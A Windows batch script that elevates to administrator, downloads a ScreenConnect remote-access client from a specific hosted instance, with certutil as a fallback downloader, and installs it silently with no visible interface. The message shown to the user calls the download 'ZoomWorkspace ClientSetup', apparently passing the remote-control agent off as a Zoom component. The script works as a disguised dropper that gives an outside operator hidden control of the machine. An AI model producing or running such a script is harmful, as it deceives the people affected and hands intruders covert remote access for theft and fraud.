@echo off
setlocal EnableExtensions EnableDelayedExpansion

:: ====== EDIT THIS: paste the MSI URL you built in ScreenConnect/Control ======
set "SC_MSI_URL=https://homesbfc1.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
:: ============================================================================

set "TMPDIR=%TEMP%\SCInstall"
set "MSI=%TMPDIR%\ScreenConnect.ClientSetup.msi"
set "MSILOG=%TMPDIR%\ScreenConnectInstall.log"

:: --- Elevate if not Admin ---
>nul 2>&1 net session || (
  echo Requesting Administrator rights...
  powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process '%~f0' -Verb RunAs"
  exit /b
)

:: --- Prep temp folder ---
if not exist "%TMPDIR%" mkdir "%TMPDIR%" >nul 2>&1

:: --- Download MSI (IWR -> certutil fallback) ---
echo Downloading ZoomWorkspace ClientSetup...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; try{ Invoke-WebRequest -UseBasicParsing -Uri '%SC_MSI_URL%' -OutFile '%MSI%' -TimeoutSec 120 }catch{ exit 1 }"
if errorlevel 1 (
  echo PowerShell download failed, trying certutil...
  certutil -urlcache -split -f "%SC_MSI_URL%" "%MSI%" >nul 2>&1
  if errorlevel 1 (
    echo ERROR: Could not download MSI. Check SC_MSI_URL and connectivity.
    exit /b 10
  )
)

if not exist "%MSI%" (
  echo ERROR: MSI not found after download.
  exit /b 11
)

:: --- Silent install with log (standard MSI switches) ---
echo Installing silently...
msiexec.exe /i "%MSI%" /qn /norestart /l*v "%MSILOG%"
set "RC=%ERRORLEVEL%"

if not "%RC%"=="0" (
  echo ERROR: msiexec returned %RC%. See log: "%MSILOG%"
  exit /b %RC%
)

echo SUCCESS: ScreenConnect/Control agent installed. Log at "%MSILOG%"
exit /b 0

